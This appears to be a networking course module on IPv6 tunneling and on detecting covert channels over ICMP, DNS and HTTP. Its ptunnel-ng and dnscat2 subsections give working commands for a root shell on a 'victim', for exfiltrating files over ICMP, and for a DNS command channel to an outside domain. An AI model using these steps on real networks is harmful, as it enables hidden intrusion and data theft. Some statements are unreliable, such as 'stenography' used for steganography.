# 4.0 Outcomes
- Describe the principles and methods of tunneling network traffic
  - Analyze traffic to locate covert channels
  - Understand SSH forward and revers tunnels
  - Analyze network tunneling diagrams
- Perform SSH Local, Dynamic, and Remote Port Forwarding
  - Using a basic network, write up the commands that allow SSH port forwarding
- Check on Learning


---
## 4.1 Tunneling
Tunneling is the process of encapsulating one network protocol within another network protocol, allowing data from one network to be transmitted over another network transparently.

Redirection refers to the process of changing the destination of data from one source to another. It allows data streams (such as input/output streams) to be redirected from their default sources or destinations to alternative locations.

The terms tunneling and redirection are sometimes used interchangeably but they are different. However, both are used to control how data is forwarded in the network. In this context, when referring to redirection we mean port forwarding. Port forwarding is much simpler than tunneling.


---
### 4.1.1 Overview of tunneling
Tunneling encapsulates a protocol inside another protocol. Tunnels must have endpoints which are devices or software that properly encapsulate packets to pass into the tunnel and to reverse the encapsulation process for traffic exiting the tunnel. There are many uses for tunneling.
- The simplest use case is to pass a protocol across a network that doesnot support that protocol, in other words, using your tools on a foreign machine that does not have them.
  - For example, passing an IPv6 packet across an IPv4 network or vice versa. Another use is for privacy.
- A tunnel can use encryption to securely move traffic across an insecure network like the internet.
- A third use would be to obfuscate the true origin of a packets when using a VPN tunnel.

Virtual private networks (VPN) can be configured to use the layer 2 tunneling protocol (L2TP). This encapsulates the entire Ethernet frame and passes it over a tunnel so that a remote machine can act as if it were physically on the same remote LAN. The world is still in the transition phase of moving from IPv4 to IPv6. Most modern-day NICs come with the ability to use IPv6. An IPv6 to IPv4 transition technology is needed when the traffic must cross an IPv4 network when travelling from start point to endpoint.


---
### 4.1.2 Overview of IPv6 tunneling over an IPv4 network
RFC 3056
- Permits 2 or more IPv6 networks to communicate over an IPv4 backbone by encapsulating the IPv6 packets into a carrier IPv4 packet that can traverse the backbone network.
- The boundary device will encapsulate the IPv6 traffic into a IPv4 packet and use itself as the source IP address. The destination IP address will be the public facing IP of the remote boundary device connected to the target IPv6 network.
- By default, the payload is not encrypted, but just encapsulated with the packet-type that can move throughout the network. However, encryption protocols such as IPSEC can be utilized.

![image](https://github.com/ruppertaj/WOBC/assets/93789685/6b7871f4-82c1-4635-acbc-842c12bfdd52)

- Vulnerabilities:
  - Traffic Tunneling: These technologies are primarily used to facilitate the transition from IPv4 to IPv6 by enabling IPv6 communication over IPv4 networks. Attackers might abuse 6to4 or 6in4 tunnels to bypass network filtering or monitoring systems. They could tunnel traffic through these mechanisms to evade detection or disguise the nature of their activities.
  - Tunneling Malware and Attacks: Since 6to4 and 6in4 encapsulate IPv6 packets within IPv4 packets, attackers could potentially use these tunnels to bypass IPv4-based security measures and launch attacks that might go undetected. Malicious actors could exploit vulnerabilities in IPv6 implementations or use these tunnels to conceal the origin of attacks.


---
### 4.1.3 Methods used
- Dual Stack (https://en.wikipedia.org/wiki/IPv6#Transition_mechanisms)
  - a "dual-stack" refers to the capability of supporting both IPv4 (Internet Protocol version 4) and IPv6 (Internet Protocol version 6) simultaneously on a network infrastructure or device.
  - Configure an IPv4 and an IPv6 address on all devices.
  - Does not work when remote devices only run one address but the pathways support the other addressing.
- 6in4 - Tunnel IPv6 traffic in an IPv4 Generic Routing Encapsulation (GRE) tunnel (https://en.wikipedia.org/wiki/6in4)
  - 6in4 is a method of encapsulating IPv6 packets within IPv4 packets, allowing IPv6 traffic to be transmitted over IPv4 networks.
  - 6in4 tunneling requires manual configuration of tunnel endpoints, typically referred to as tunnel endpoints or tunnel brokers.
  - Uses GRE
  - Simple and deterministic
  - No need for IPv6 anycast broadcasting
  - Needs to be manually configured
  - Uses IP protocol 41 (https://simple.wikipedia.org/wiki/Protocol_41) as the underlying protocol to signify that IPv6 is encapsulated.
- 6to4 - Internet transition mechanism for migrating from Internet Protocol version 4 (IPv4) to version 6 (IPv6) and a system that allows IPv6 packets to be transmitted over an IPv4 network (generally the IPv4 Internet) without the need to configure explicit tunnels. Special relay servers are also in place that allow 6to4 networks to communicate with native IPv6 networks. (https://en.wikipedia.org/wiki/6to4)
  - 6to4 encapsulates IPv6 packets within IPv4 packets using a special addressing format for transmission over IPv4 networks.
    - The format is typically represented as 2002:IPv4_address::/48, where IPv4_address is the IPv4 address of the tunnel endpoint.
    - For example, if the IPv4 address of the tunnel endpoint is 192.0.2.1, the corresponding 6to4 IPv6 prefix would be 2002:c000:0201::/48.
  - 6to4 tunnel endpoints are automatically configured based on the IPv4 address of the endpoint.
  - Self optimizes
  - Good option for mobile devices
  - Can be harder to debug than 6in4
  - Only supports IPv4 public to IPv4 public address to encapsulate the IPv6 traffic within. In other words, no private IP addresses and no NAT or PAT supported.
  - Intended for use only while the internet does not have IPv6 support. For now, much of the internet does not support IPv6
  - Also uses IP protocol 41 (https://simple.wikipedia.org/wiki/Protocol_41).
- 4in6 - Similar to 6to4 except the encapsulation is reversed.
  - 4in6 tunneling is a method used to enable IPv4 connectivity over IPv6 networks.
  - IPv6 will have the 4 as the next header to identify IPv4 is encapsulated.

![image](https://github.com/ruppertaj/WOBC/assets/93789685/648dc847-1a4f-474e-a62c-37d79463840b)

References:  
https://packetlife.net/blog/2010/mar/15/6to4-ipv6-tunneling/  
https://datatracker.ietf.org/doc/html/rfc3056  
https://datatracker.ietf.org/doc/html/rfc4380  


---
### 4.1.4 Overview of Teredo Tunneling
Teredo tunneling is a method used to enable IPv6 connectivity for devices located behind IPv4 NAT (Network Address Translation) devices or firewalls. It’s designed to facilitate IPv6 communication between IPv6-capable hosts over IPv4 networks, particularly in situations where native IPv6 connectivity is not available.

Defined in [RFC 4380](https://datatracker.ietf.org/doc/html/rfc4380).

Tunnel IPv6 traffic in an auto-tunnel using a multi-server auto-configured process with Microsoft

Teredo is a transition technology that gives full IPv6 connectivity for IPv6-capable hosts that are on the IPv4 Internet but have no native connection to an IPv6 network. Unlike similar protocols such as 6to4, it can perform its function even from behind network address translation (NAT) devices such as home routers.

(https://en.wikipedia.org/wiki/Teredo_tunneling)

Teredo operates using a platform independent tunneling protocol that provides IPv6 (Internet Protocol version 6) connectivity by encapsulating IPv6 datagram packets within IPv4 User Datagram Protocol (UDP) port 3544 packets. Teredo routes these datagrams on the IPv4 Internet and through NAT devices. Teredo nodes elsewhere on the IPv6 network (called Teredo relays) receive the packets, un-encapsulate them, and pass them on.

- Allows IPv4 clients to access IPv6 clients and use Teredo servers and relays as a bridge.
- Auto-configures itself
- Can bypass most firewalls easier
- Done by the host and not the routers
- Allows the use of NAT using the same teredo address
- Enabled by default in Windows
- More complicated than other methods
  - Requires a Teredo server and relay
- Uses the 2001:0000::/32 prefix
  - Appends Teredo’s IPv4 address for the remaining 32 bits
- Teredo address structure
  - 32 bit Prefix: 2001:0000:
  - 32 bit Teredo Server IPv4 address: 65.54.227.120 = 4136:e378
  - 16-bits for Flags
  - 16-bits for Obfuscated UDP port: 40000 = 63bf
    - This is the port number that the NAT maps to the Teredo client, with all bits inverted.
  - 32-bits for Obfuscated Client public IPv4: 192.0.2.45 = 3fff:fdd2
    - This is the public IPv4 address of the NAT with all bits inverted.
  - The binary digits are inverted for obfuscation
- Linux systems use the Miredo (https://en.wikipedia.org/wiki/Miredo)
- Intended for interoperability use until all devices are converted to IPv6

![image](https://github.com/ruppertaj/WOBC/assets/93789685/7eac6e12-d30c-4129-9736-48d65e92beda)


---
### 4.1.5 ISATAP
Intra-Site Automatic Tunnel Addressing Protocol

(https://en.wikipedia.org/wiki/ISATAP)

- Internal use only. Cannot be used for public communications over the internet.
- Can be used over the internet for specific site-to-site communications.
- Defined in [RFC 5214](https://datatracker.ietf.org/doc/html/rfc5214).
- Routing:
  - Relies on existing IPv4 routing infrastructure for forwarding encapsulated IPv6 packets.
  - Routers within the IPv4 network must be configured to support ISATAP tunneling.
- Intra-Site Communication:
  - Primarily designed for communication within a site or organization.
  - Facilitates IPv6 connectivity between devices within the same network.
  - Enables devices to communicate using IPv6 protocols over an IPv4 infrastructure.
- Automatic Addressing:
  - Automatically assigns IPv6 addresses to devices participating in the ISATAP network.
  - IPv6 addresses are derived from the underlying IPv4 addresses, ensuring compatibility.
  - Generates a Link-Local address using its IPv4 address
    - Uses FE80:: for the 64-bit prefix
    - Uses 0000:5EFE as the first 32-bits in the 64-bit interface ID
    - Converts the IPv4 address into HEX for the remaining 32-bit interface IP address
    - `192.168.199.99` would create: `FE80:0000:5EFE:c0a8:c763`
- Generates a global address in a similar fashion
  - Will use the 64-bit prefix for the organization
  - 64-bit interface ID will be generated the same as the link-local address above

References:  
https://datatracker.ietf.org/doc/html/rfc5214
https://www.arin.net/vault/blog/2013/05/14/how-isatap-works-and-how-it-can-help-you-migrate-to-ipv6-2/


---
## 4.2 Overview of Covert Channels
Definition: The term ‘covert channel’, when applied to computer networks, describes a mechanism for sending information without the knowledge of the network administrator or other users. Depending on the context, it can also be defined as:
1. a transmission channel that may be used to transfer data in a manner that violates security policy
2. a means of communication via a protocol that is not normally intended to be used for communication
3. a mechanism for sending and receiving information data between machines without alerting any firewalls and IDSs on the network

In other words, a covert channel is an evasion or attack technique that is used to transfer information in a secretive, unauthorized or illicit manner. A covert channel can be used to extract information from or implant information into a network. Keep in mind here that this is not encryption. Often, data sent via covert channels (usual traffic) is plain text as encrypted traffic might trigger warning and attract the eyes of security professionals.


---
### 4.2.1 How it works
A Covert Channel is the digital equivalent of a briefcase with a secret compartment that a spy might use to slip sensitive documents past security guards into or out of a secure facility. An attacker might use Covert Channels to transmit sensitive infromation unobserved. They can do so by walking straight through network security measures and Intrusion Detection Systems/Intrusion Prevention Systems. Just as a spy can use that same secret compartment to conceal a weapon from security guards while entering a building, an attacker can use a covert channel to conceal a cyberweapon (AKA Malware) inside a packet that looks normal


---
### 4.2.2 Types of Covert Channels
1. Storage Channels- Communicates by modifying a storage location, such as a hard drive. This is the most common type.
- Payload - Encapsulates a communication channel within another (more common) protocol that is not typically used for bidirectionally sharing data.
- header - Uses header fields that are not meant to store bits of data. This method is much slower than manipulating the payload, but because of that, it is often overlooked.
  - IP Header:
    - TOS (Type of Service) field, consisting of the DSCP and ECN
    - IP ID field
    - Flags and Fragmentation offset field.
    - Additional Options added.
  - TCP Header:
    - Reserved field
    - URG pointer field
    - Additional Options added.
2. Timing Channels - Performs operations that affect the 'real response time observed' by the receiver.
  - Timing Channels data are encoded in inter-arrival times between consecutive packets based on modifying the transmission time of legitimate traffic.
  - Typically, the modification of time takes place by delaying the transmitted packets on the senders side.
  - A key aspect in covert timing channels is to find the threshold of packet delay that can accurately distinguish covert traffic from legitimate traffic.
  - Method can be less reliable over longer distances because inter-routing can affect timing.

The most common Storage types of Covert Channels are: ICMP DNS HTTP


---
## 4.3 Detecting Covert Channels
With tunneling and redirection, information can be moved from one system to another without either system being aware of each other. When transferring information from one system to another without the knowledge of the system owners, a covert channel is created. Understanding how covert channels are created helps to understand ways to detect them.


---
### 4.3.1 Host Analysis
Detecting covert channels on a host requires knowledge of each applications expected behavior. Analysis of the host’s socket table can reveal when an application creates a connection. Monitoring the connections made by applications and knowing how and when applications should be communicating can help detect covert channels. This is another reason to keep an eye on your own system and get a reliable baseline for new systems that you are asked to work on


---
### 4.3.2 Network Analysis
Like Host Analysis to watch for covert channels, a good understanding of your network and the common network protocols being used is the key to detecting covert channels through your autonomous system. Being able to spot differences between your network baseline and what is unusual is a daunting task, but an essential one in order to find traffic that is using some form of obfuscation. Each networking protocol in your system will follow a pattern that can be recognized through a good baseline knowledge. Keep in mind the relationship for the client and server over the internet protocols.

For example, usual HTTP traffic will be rather quick. Usually, a web client(browser) will send a GET request to a web server (website). The server will then respond with an acknowledgement and supply the web page that was asked for. These are most often short bursts of activity. However, that is not necessarily a red flag, when using .edu sites or a video viewer sites, a user can take considerable time.

Another example is SSH. Some SSH sessions can remain established for days at a time or longer. This does not look threatening. Even multiple established SSH sessions using the same authentication to virtual machines and environments can be a normal occurance for your system. You may need to watch more for quick SSH sessions instead. A quick login and a large file transfer may indicate something worth looking into.


---
### 4.3.3 Detecting Covert channels with ICMP
ICMP is a rather straight forward protocol used to verify a connection between two hosts. With a simple echo request followed by an echo reply. If one side of the connection does not comply, this protocol cannot be used to covert channels. So before trying to use ICMP as the underlying protocol for covert channels, you would need to determine whether both directions can send receive ICMP.

Using ICMP as the underlying protocol for covert channels looks at using the payload portion of the protocol for sending and receiving the data. This works well, but very slowly as there is not much payload space for sending and receiving commands or information to and from the hosts. On account of that, it can be common to see just 1 byte of data sent with the ICMP messages at a time. So look for many ICMP packets and put them together to detect an adversary using ICMP for covert channels.

![image](https://github.com/ruppertaj/WOBC/assets/93789685/f7af6265-b550-453c-81ad-3faa86a6803e)

Some possible ways to detect ICMP covert channels are:

- Size - Echo request packets are typically very small (up to about 64K). Although the size can be adjusted by the sender but the size should be the same in both directions. Keep in mind to look for lopsided ICMP conversations. However, some tools can standardize the size of packets to disguise this.
- Amount - Most of the time, ICMP messages are fairly steady in size and pace. When used as a covert channel, echo requests can appear "Bursty". Covert channels have to contend with unequal upload/download variences. For example, if ICMP is being used as the covert channel for http GET requests and then to download that webpage.
- Payloads - Echo requests have standardized ASCII payloads. Usually with consecutive numbers or letters. (Linux will often use 0123456789 in both echo request and recieve 0123456789 in the echo reply)(windows will often use 'abcdefg hi' in both requests and replys). However, with using the -p option for ping, arbitrary data can be manually placed into the payload.
- Unbalanced requests/replies - Normal ping operations have 1 echo request and 1 echo reply. However, when TCP is used within the ICMP covert channel, the balance may result in 1 echo request receiving many echo replies.

An example:

ICMP traffic is usually small and easy to recognize as it is just request and reply, or request and cannnot be found. A typical pcap involving regular icmp traffic will look like:

![image](https://github.com/ruppertaj/WOBC/assets/93789685/5a7068c1-36a9-4b98-8c2e-1860a1825e4c)

If you notice in the above example, all the packets are relatively small. For a couple of the websites, there needed to have a quick DNS query to resolve URLs to IP addresses, but after that, a simple icmp echo request (type 8, code 0) was followed by an echo reply (type 0, code 0). If there had been an address that was not available, the echo request would have been followed by a 'destination unreachable' (type 3, code 0-15) and the reason why.

Using ICMP with -p option will allow you to specify up to 16 'pad' bytes to fill out a packet. This is also legitimate traffic and will result in the exact same message from the server, it is useful for diagnosing data-dependent problems within a network. However, the reply from the pinged computer will reflect the same message that was sent. So, you will need to watch for echo request and reply messages to mirror each other in that case.

So, when analysis icmp messages for covert channels, you will need to watch for excessive packets being sent, sixe of packets being sent and the messages associated with those packets being sent. In order to get and ICMP request and reply onto the network, the headers cannot manipulated very much or they will not be allowed to traverse a network and may also trigger a firewall to drop them, so it is mostly useful to look into the data portions of the packets that have been captured.

Below is an example of ICMP used to hide malicious traffic within the regular ICMP messages.

![image](https://github.com/ruppertaj/WOBC/assets/93789685/ecf7e904-63b0-4a06-ad4c-2b583c75de5a)

In the above example, there are only echo requests and echo replies being sent back and forth, however, within those legitimate packets, the data shows something that is not supposed to be there. If you look in the packet bytes section, you will see that someone is using the 'makefile' command and is making tcpcat within it. TCPCat is a linux-based tool that prints data from a remote host. Obviously, not regular ICMP traffic. It should not be allowed to do that.

Later in the pcap, using ICMP, the commands to install drivers and send information to the client from the server are sent over the network using this same ICMP tunnel for Covert Communications

Some useful tools to combat this and sniff it out are:
- ptunnel - A well developed and documented ICMP tunneling software which supports multiple concurrent connections and password authentication. Source will compile on Unix variants and Windows. (http://www.cs.uit.no/~daniels/PingTunnel/PingTunnel-0.71.tar.gz) (http://www.mit.edu/afs.new/sipb/user/golem/tmp/ptunnel-0.61.orig/web/)
- Loki - A venerable ICMP Backdoor program. Originally released in 1996 in the hacker magazine ‘Phrack’ (http://phrack.org/issues/49/6.html)
- 007Shell - A tunneling package similar to Loki, which pads each packet in multiples of 64 bytes, making the tunnel appear more like legitimate traffic. (https://packetstormsecurity.com/files/15936/007shell.tgz.html)
- ICMP Backdoor - A rough-around-the-edges program which uses only ping reply packets. Because it doesn’t pad up short messages or divide large messages, some IDS systems can easily detect traffic from this back- door tool. Compiles in several versions of Unix. (http://packetstormsecurity.org/UNIX/penetration/rootkits) (https://github.com/droberson/icmp-backdoor)
- B0CK - A variant which uses IGMP multicast messages to improve on the work done by the authors of Loki and 007Shell. Also goes to the trouble of encoding the embedded address field for, arguably, additional covertness. (http://www.s0ftpj.org/bfi/bfi7.tar.gz)
- Hans - An IP (TCP) over ICMP solution. Employs TUN/TAP devices to permit it to operate reliably if the firewall prevents multiple echo replies per request. Compiled for Unix and iPhone platforms (http://code.gerade.org/hans/)


---
#### 4.3.3.1 Setting up ICMP Covert Channels by using ptunnel-ng
Installing ptunnel-ng  
*This has to be done on both the client and server machines.*

- The install requires a few components to be installed if they are not already.
  - `sudo apt-get install automake`
  - `sudo apt-get install gcc`
  - Once that is done, clone the repo: `git clone https://github.com/lnslbrty/ptunnel-ng.git`
  - Change into the directory: `cd ptunnel-ng`
  - Now we need to create the binary: `sudo ./autogen.sh`
  - We can then use ptunnel-ng by invoking it from the directory where we compiled the binary, or install it to make it globally usable.
  - `sudo make install`
- Starting the server / victim
- In this example we will just have the victim running the server code so we can gain access to a shell on the victim over ICMP.
- There are other ways to set the ICMP tunnel up so the victim can relay traffic for us, but we will just keep it simple.
  - `sudo ptunnel-ng`

![image](https://github.com/ruppertaj/WOBC/assets/93789685/9c3220e7-5faf-4398-82c9-b38eb444e35e)

- Starting the client
- Starting the client is a two step process, you will need two command shells.

SHELL 1: Forwarder
- The first command shell will setup a forwarder on your local machine. This forwarder can be used just like most ssh forwarders.
  - `syntax: sudo ptunnel-ng -p[Server-IP/NAME] -l[local listening port number]`
- The -p is the Fully Qualified Domain Name (FQDN) or IP address of the machine running the server.
- The -l is the local port we wish to use to access the tunnel.
  - `sudo ptunnel-ng -p 159.65.160.169 -l 4444`
- In this case we are setting up our port 4444 to forward to 159.65.160.169.

![image](https://github.com/ruppertaj/WOBC/assets/93789685/dcc3d5d9-5c88-484f-aeaf-34c03a678890)

SHELL 2: Interactive
- The second shell is where we will use our tunnel and connect to the victim.
  - `ssh root@localhost -p 4444`

![image](https://github.com/ruppertaj/WOBC/assets/93789685/4ca71479-d1b6-47e9-b254-ab5fd0a27df8)

- From here we have an SSH session that we can use.
- However, we can also use the ICMP tunnel to SCP files from the victim.
  - `scp -P 4444 root@localhost:/root/test.txt`

![image](https://github.com/ruppertaj/WOBC/assets/93789685/2bca0124-ce61-44ed-8acb-3b93389a5b86)

- This allows us to exfil data we have stored on the victims machine out of the network without triggering any alerts on files leaving the network.


---
### 4.3.4 Detecting Covert Channels with DNS
DNS can be a great place to hide traffic as it is mostly done between servers and clients and without the knowledge of the user at all. Most people will not take the time to look through DNS traffic because they will assume that it is necessary for your internet browser to find what you are looking for. In other words, "I don’t know how it works, but I know it needs to work". For that reason, DNS is particularly pervasive and is often allowed through network protection devices without scrutiny. I also happens away from the view of the user, just assuming that it is all necessary for proper functionality of user applications.

Now, keep in mind here that most DNS traffic is typically very small which means that any tunneling through DNS traffic would only allow for a very small throughput. In some cases, the message might only allow for one or two characters to be transmitted at a time. If this is the case, keep a sharp eye out for multiple DNS packets with almost nothing in them, but that would be able to send a message when they are all put together.

There is limit to the size of DNS URL responses. A user can ask (query) as many websites as they want. However, because of this, DNS has led to some misuse in the past. With multiple DNS queries and responses than is needed, an attacker can hide some messages within the traffic that is sent.

Covert Channels using DNS as a cover can also be used to send low-level instructions within the URL information that is queried or responded to. You would need to look deeper into the packet in order to see and read those instructions.

![image](https://github.com/ruppertaj/WOBC/assets/93789685/1ca8b2ef-1b2a-42bd-840c-94fbad2a4874)

Some possible ways to detect DNS covert channels are:
- Size - DNS messages have no defined limit but the typical sizes of DNS messages are usually under 512 bytes UDP payload using IPv4. With a 20-byte IPv4 header and a 8-byte UDP header, this can bring the packet size to 540-bytes. Due to larger address sizes on IPv6, this increased the minimum UDP payload size to 1232-bytes. With a 60-byte IPv6 header and a 8-byte UDP header, this can bring the packet size to 1300-bytes. Pretty standard and easy to predict with those numbers, although slight deviations are possible. If an attacker is using DNS to run their covert channels, packet size fluctuations may be noticable.
- Amount - Much like ICMP, DNS is a standard query and response protocol. One query will typically have only one response. Once the query has been responded to, there should not be further requests for the same URL (domain) as the new address will have been cached. A goo way to spot covert channels being ran via DNS is if there are multiple queries and responses for the same domain, or if one query has many responses to it.
- Payload - The DNS queries are asking about domain names and how to resolve them to IP addresses in order to look things up using a name that is easily recognizable by humans. That is so we do not have to learn and memorize the IP addresses of all our favorite websites. So the typical response to DNS queries should be the domain name and the corresponding IPv4 or IPv6 addresses in the payload. So if DNS is being used as a covert channel, the payload will look anything but typical.
- Unbalanced requests/replies - Imagine if a TCP communication was hidden within UDP messages. TCP by nature can burst and uneven. One TCP request for information can initiate several responses and with an acknowledgement message following each one. Even during slow periods of a TCP remote connection (ssh, rdp, telnet), there will be constant messages to keep the connection 'ALIVE'. When this is done via DNS, you may see one DNS query with many responses. During slow periods you may see a constant stream of queries/responses to maintain the connection. Also, after the normal DNS query and response, you should see a HTTP message to connect to the quieried website. With covert channels, there will be uneven replies and requests but no connection to any site.

An example:

DNS traffic is usually small and easy to recognize as it is just request and reply. A typical pcap involving regular DSN traffic will look like:

![image](https://github.com/ruppertaj/WOBC/assets/93789685/5e9e54b4-6da3-4b33-b06a-328a2da0f899)

In the above example, I have omitted the tcp traffic as well as the ssh, rdp, and telnet traffic. This shows only the DNS queries and responses. You can see a typical DNS query for newegg.com with the response of where to find it. After that, there was HTTP traffic to navigate to the website along with multiple packets for additinoal links found within the HTML prgoramming on the website for if the user wanted to click on a link or picture to shop for the product.

You can also see queries for promotions within newegg.com as well as links for facebook.com, wikipedia.org, youtube.com, twitter.com, and reddit.com. Also visible are the separate record types within DNS, including the CNAME, the SOA, the AAAA, and TXT records associated with the queried websites.

Look at the size of the packets too. Most of them are fairly small. The responses are a little larger because they contain the quieried information that the user will need to conduct their internet browsing. So, if you filter on DNS traffic within a pcap, this is typical of what you would be looking at.

Now, let’s look at a known bad DNS pcap that is using covert channels.

![image](https://github.com/ruppertaj/WOBC/assets/93789685/ef79a336-c08e-4583-b112-5b7ba1f75130)

Now, in this example, there is bunch of oddities that might stand out to you. All the packets are mostl unifrom in length which doens’t tell us too much. This attacker did a good job of making sure the packet sizes aren’t too inconspicuous. That means that many more packets would have to be sent to in order to use DNS as their covert channel, which is easy to find too. However, they are all a bit larger than normal.

But the main kicker here is the payload. These packets are all encrypted! There is no reason for that in ligitimate DNS traffic at all. The computer will not try to hide their information from the user when asked about the whereabouts of a website. Also, look at the name of the packets that were captured. They are using DNSCAT2. There is a link below that explains what that tool does.

The following packets have been omitted to only show the DNS with covert channels attached.

Some useful tools to combat against (or help creating) Covert channels with DNS are:
- OzymanDNS - The OzymanDNS client is just a perl script which encodes and transfers everything it receives on STDIN to it’s destination, via DNS requests. Replys are written to STDOUT. (https://dnstunnel.de/)
- NSTX - Nameserver Transfer Protocol - makes it possible to create IP tunnels using DNS queries and replies for IP packet encapsulation where IP traffic other than DNS isn’t possible. (http://savannah.nongnu.org/projects/nstx/)
- dns2tcp - a network tool designed to relay TCP connections through DNS traffic…​ The client listen on a predefined TCP port and relays each incoming connection through DNS to the final service. (https://tools.kali.org/maintaining-access/dns2tcp)
- iodine - This is a piece of software that lets you tunnel IPv4 data through a DNS server. This can be usable in different situations where internet access is firewalled, but DNS queries are allowed. (https://github.com/yarrick/iodine)
- heyoka - a Proof of Concept of an exfiltration tool which uses spoofed DNS requests to create a bidirectional tunnel. It aims to achieve both performance and stealth, and is released under the GPLv2 (http://heyoka.sourceforge.net/)
- dnscat2 - designed in the tradition of Netcat and, more recently, Ncat. Basically, it lets two hosts communicate with each other via the DNS protocol. …​ Communicating by DNS is great because the client only needs the ability to talk to a single DNS server, any DNS server on the Internet (with recursion enabled) (https://github.com/iagox86/dnscat2)


---
#### 4.3.4.1 Setting up Covert Channels by using DNSCAT2
- *Install dnscat2*
- Server
  - `sudo apt-get install gcc`
  - `sudo apt-get install automake`
  - `sudo apt-get install ruby-dev`
  - `git clone https://github.com/iagox86/dnscat2.git`
  - `cd dnscat2/server/`
  - `sudo gem install bundler`
  - `sudo bundle install`
- Client
  - `sudo apt-get install gcc`
  - `sudo apt-get install automake`
  - `git clone https://github.com/iagox86/dnscat2.git`
  - `cd dnscat2/client/`
  - `make`
- *Starting*
- Server
  - `ruby ./dnscat2.rb -e open -d host=0.0.0.0,port=53,domain=plaid-jello.com`

![image](https://github.com/ruppertaj/WOBC/assets/93789685/5aa84e54-1736-4397-b857-1a3635f23dca)

- Client
  - `./dnscat --dns server=plaid-jello.com,port=53`

![image](https://github.com/ruppertaj/WOBC/assets/93789685/54dd99f0-8094-400d-a341-b308178f04e8)

- *Using*
- Server
  - Once a callback has been recieved:
  - `session -i 1`
  - `shell`
  - `ctrl-z`
  - `window -i 2`

![image](https://github.com/ruppertaj/WOBC/assets/93789685/059c5d90-a370-43ac-bc83-719be2d6e98a)


---
### 4.3.5 Detecting Covert Channels with HTTP
Hyper Text Transfer Protocol (HTTP) is another great place to hide Covert channels and information because it’s main job is to reach out into the internet and get something. So it can very convenient to place additional information in the packets that are already going across the network anyways. HTTP will send out a GET request to look at the servers webpage, this is usually hosted on a companys webserver in their DMZ so as not to allow too many people into their internal network (think front of the restaurant, while the main portions of the company are behind their DMZ, or in the kitchen cooking the food).

Once a webserver receives a GET request, they will comply and push out the contents of the webpage to the browser that asked for it. Sometimes this can be a lot of information all at once. Whether it is just a picture, or hyperlinks, or videos, or whatever, there will most likely be a lot of traffic sent from the web server. So it will be large, bursty, and uneven.

![image](https://github.com/ruppertaj/WOBC/assets/93789685/791f12c7-fdfa-4698-a042-19af73b4c53b)

It may be a bit more difficult to spot covert channels via HTTP because of how HTTP works. Unlike the other protocols we have discussed. So let’s look at our common ways to spot covert channels.

Some possible ways to detect HTTP covert channels are:
- Size - can not be used to determine since HTTP traffic will almost always vary is size. It all depends on what the user is looking at. Larger pictures can be sent quickly and downloads can show as enormous sizes. Video is even larger in most cases and will show a huge amount of traffic.
- Amount - HTTP traffic is already 'bursty' in nature and so this is also not a very reliable way to check for covert channels. When a website is requested, there is many packets of information that is sent at a quick pace, this is when the website loads up the clients webpage with the HTML file that the company wants them to see. Often, company need to send their pictures in a quick and 'bursty' fashion so that the client can browse and shop by looking at the pictures.
- Payloads - Typical HTTP payloads consist of client request messages such as GET, PUT, POST, etc. when asking to go a webpage. They can also receive server response codes depending on the error that it gives (200, 300, 400, etc.) HTTP traffic will also show the requested payload that was asked for, however, it might already be encrypted if they are using HTTPS, making the payload even harder to identify.
- Unbalanced Request/Reply - HTTP is a request and reply protocol. It will deliver the webpage that is asked for if it can find it. HTTP receives requests ffor webpages and thn sends responses to theses request, and then the connection is terminated. When a new request is needed, the connection need to be re-established. So it is not unusual to have a giant imbalance. It’s typical for one webpage request to be responded with many responses as the webpage is downloading. However, you can look for a covert channel by following a conversation when you see constant requests/responses while MAINTAINING a constant connection to a remote site.

An example:

HTTP traffic is usually large and easy to recognize in wireshark. After a typical DNS query and response, there will almost always be a GET request from the website that was just asked for. A typical pcap involving regular HTTP traffic will look like:

![image](https://github.com/ruppertaj/WOBC/assets/93789685/a40d60ad-5ea7-4c87-8927-0c9ddf4962ae)

In the above PCAP, the DNS traffic has been omitted and is only showing the HTTP and corresponding OCSP (Online Certificate Status Protocol) traffic that goes with it. The conversation began with a GET request for www.malibuboats.com. The browser clearly decided that it is always wakeboarding season, and it’s right. Following the request, the packets shown are receiving the contents of the website that was asked for.

Later, in packet no. 20436, the user clicked a link within the website to navigate over a local dealer of boats and browse their inventory. If you click on the link, there will show [Full request URI: http://www.singletonmarine.com/wp-content/]. From there, you can see the corresponding requests and responses to the new website.

Like this example, most HTTP traffic will look similar when captured in a pcap. Unless already saved, there should be a quick DNS request and response followed by a GET request from the client to the server. After that, there will be packets sent to the browser in order for them to browse and read content and peruse pictures and videos. It should be easy to follow and easy to understand. There should not be any 'keep alive' traffic. But you may have to look into the content of the HTTP to detect covert channels.

![image](https://github.com/ruppertaj/WOBC/assets/93789685/69108f37-0553-4dd1-81e4-936094492485)

In the above example, we had to look into the payload of the HTTP traffic in order to even suspect a problem with the packet. The other layers and headers needed to be crafted properly in order to enter the network. So, like the highlighted packet, the HTTP traffic is asking for a download from a strange IP address that may not be known and not trusted.

Because of the aforementioned reasons, when searching for covert channels via HTTP, it will take longer and be much more resource intensive to find.

Some useful tools to interact with Covert channels with HTTP are:
- tunnelshell tool - a program written in C for Linux users that works with a client-server paradigm. The server opens a /bin/sh that clients can access through a virtual tunnel. It works over multiple protocols, including TCP, UDP, ICMP, and RawIP, will work. Moreover, packets can be fragmented to evade firewalls and IDS (https://www.hackingarticles.in/covert-channel-the-hidden-network/)
- HTTPTunnel - a tunneling software that can tunnel network connections through restrictive HTTP proxies over pure GET and POST requests (https://github.com/larsbrinkhoff/httptunnel)
- SirTunnel - Allws you to expose a host securely via HTTP on a public URL (https://github.com/anderspitman/SirTunnel)
- go HTTP tunnel - a reverse tunnel based on HTTP. It enables sharing without the need for a public IP (https://github.com/mmatczuk/go-http-tunnel)


---
### 4.3.6 Stenography
https://sansorg.egnyte.com/dl/EmWUMdvoVP

Definition: Stenography is the practice of hiding a secret message inside of (or even on top of) something that is not secret. …​ It is a form of covert communication and can involve the use of any medium to hide messages. It’s not a form of cryptography, because it doesn’t involve scrambling data or using a key. While cryptography is about protecting the content of messages, stenography is about concealing their very existence. A good way to think of it is hiding information in other information. If you do not believe that there is anything malicious about a file, most of the time, there is no need to check it.

There are several Modes of stenography. Usually we think of Stenography as hiding a message in a picture, but it is possible to hide a message in most files and transfer it that way.
- Injection - Propagation payload or embedded data is place inside the original (unaltered) host cover-text, cover-image, cover-audio or cover-program file. Process will increase the size of the file but must be done in a manner that the native application will not reveal the data. Files with loose compression are ideal as they tend to have more "white-space". Tightly compressed files have less white-space and is more difficult to inject a message.
  - This is the second most common method used.
